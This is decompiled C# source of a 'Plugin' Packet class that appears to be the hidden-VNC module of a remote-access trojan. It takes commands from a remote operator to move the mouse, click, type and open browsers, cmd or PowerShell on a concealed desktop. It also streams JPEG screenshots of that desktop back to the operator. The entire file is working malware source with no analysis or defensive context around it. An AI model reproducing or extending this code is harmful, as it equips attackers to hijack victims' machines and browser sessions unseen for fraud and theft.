using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Plugin.Helper;
using Plugin.Helper.OpenApp;

namespace Plugin;

internal class Packet
{
	private static ImageCodecInfo jpegCodecInfo = GetEncoderInfo(ImageFormat.Jpeg);

	public static int quality = 0;

	public static EncoderParameters encoderParams;

	private static ImageCodecInfo encoder = ImageCodecInfo.GetImageEncoders().First((ImageCodecInfo c) => c.FormatID == ImageFormat.Jpeg.Guid);

	public static bool IsOk { get; set; }

	public static void Read(byte[] data)
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Expected O, but got Unknown
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 7:
				switch (text[0])
				{
				case 'C':
					if (!(text == "Capture"))
					{
						break;
					}
					if ((bool)array[1])
					{
						quality = (byte)array[2];
						encoderParams = new EncoderParameters(1);
						encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
						new Thread((ThreadStart)delegate
						{
							Capture();
						}).Start();
					}
					else
					{
						IsOk = false;
					}
					break;
				case 'Q':
					if (text == "Quality")
					{
						quality = (byte)array[1];
						encoderParams = new EncoderParameters(1);
						encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
					}
					break;
				}
				break;
			case 9:
				switch (text[0])
				{
				case 'M':
					if (text == "MouseMove")
					{
						int x = (int)array[1];
						int y = (int)array[2];
						HideDesktop.Load(Plugin.HVNCDesktop);
						HandelMouse.MouseMove(x, y);
					}
					break;
				case 'R':
					if (text == "RunCustom")
					{
						CustomOpen.Open((string)array[1], (string)array[2]);
					}
					break;
				}
				break;
			case 10:
				switch (text[5])
				{
				case 'C':
					if (text == "MouseClick")
					{
						byte num = (byte)array[1];
						int x3 = (int)array[2];
						int y3 = (int)array[3];
						HideDesktop.Load(Plugin.HVNCDesktop);
						if (num == 4)
						{
							HandelMouse.MouseLeftUp(x3, y3);
						}
						if (num == 16)
						{
							HandelMouse.MouseRightUp(x3, y3);
						}
						if (num == 2)
						{
							HandelMouse.MouseLeftDown(x3, y3);
						}
						if (num == 8)
						{
							HandelMouse.MouseRightDown(x3, y3);
						}
					}
					break;
				case 'W':
					if (text == "MouseWheel")
					{
						HideDesktop.Load(Plugin.HVNCDesktop);
						if ((bool)array[1])
						{
							HandelMouse.ScrollUp();
						}
						else
						{
							HandelMouse.ScrollDown();
						}
					}
					break;
				}
				break;
			case 16:
				if (text == "MouseDoubleClick")
				{
					int x2 = (int)array[1];
					int y2 = (int)array[2];
					HideDesktop.Load(Plugin.HVNCDesktop);
					HandelMouse.MouseDuoblClieck(x2, y2);
				}
				break;
			case 13:
				if (text == "KeyboardClick")
				{
					HideDesktop.Load(Plugin.HVNCDesktop);
					if ((bool)array[1])
					{
						HandelMouse.KeyboardDown((int)array[2]);
					}
					else
					{
						HandelMouse.KeyboardUp((int)array[2]);
					}
				}
				break;
			case 3:
			{
				if (!(text == "Run"))
				{
					break;
				}
				string text2 = (string)array[1];
				if (text2 == null)
				{
					break;
				}
				switch (text2.Length)
				{
				case 6:
					switch (text2[0])
					{
					case 'C':
						if (text2 == "Chrome")
						{
							Chrome.OpenChromeBrowser();
						}
						break;
					case 'Y':
						if (text2 == "Yandex")
						{
							Yandex.OpenYandexBrowser();
						}
						break;
					}
					break;
				case 5:
					if (text2 == "Brave")
					{
						Brave.OpenBraveBrowser();
					}
					break;
				case 4:
					if (text2 == "Edge")
					{
						Edge.OpenEdgeBrowser();
					}
					break;
				case 7:
					if (text2 == "FireFox")
					{
						FireFox.OpenFireFoxBrowser();
					}
					break;
				case 3:
					if (text2 == "Cmd")
					{
						CommandPrompt.Open();
					}
					break;
				case 10:
					if (text2 == "Powershell")
					{
						PowerShell.Open();
					}
					break;
				case 8:
				case 9:
					break;
				}
				break;
			}
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}

	public static void Capture()
	{
		if (IsOk)
		{
			return;
		}
		IsOk = true;
		try
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			HideDesktop.Load(Plugin.HVNCDesktop);
			while (IsOk && Client.itsConnect)
			{
				try
				{
					Client.Send(LEB128.Write(new object[3]
					{
						"HVNC",
						"Screen",
						BitmapToByteArrayWithQuality(HelperScreen.GetScreen(width, height), encoderParams)
					}));
					Client.keepPing.Last();
				}
				catch (Exception)
				{
					IsOk = false;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static byte[] BitmapToByteArrayWithQuality(Bitmap bitmap, EncoderParameters encoderParams)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		Bitmap val = new Bitmap(((Image)bitmap).Width, ((Image)bitmap).Height);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.InterpolationMode = (InterpolationMode)3;
				val2.SmoothingMode = (SmoothingMode)1;
				val2.CompositingQuality = (CompositingQuality)1;
				val2.DrawImage((Image)(object)bitmap, 0, 0, ((Image)bitmap).Width, ((Image)bitmap).Height);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			using MemoryStream memoryStream = new MemoryStream();
			((Image)val).Save((Stream)memoryStream, encoder, encoderParams);
			return memoryStream.ToArray();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		foreach (ImageCodecInfo val in imageEncoders)
		{
			if (val.FormatID == format.Guid)
			{
				return val;
			}
		}
		return null;
	}
}
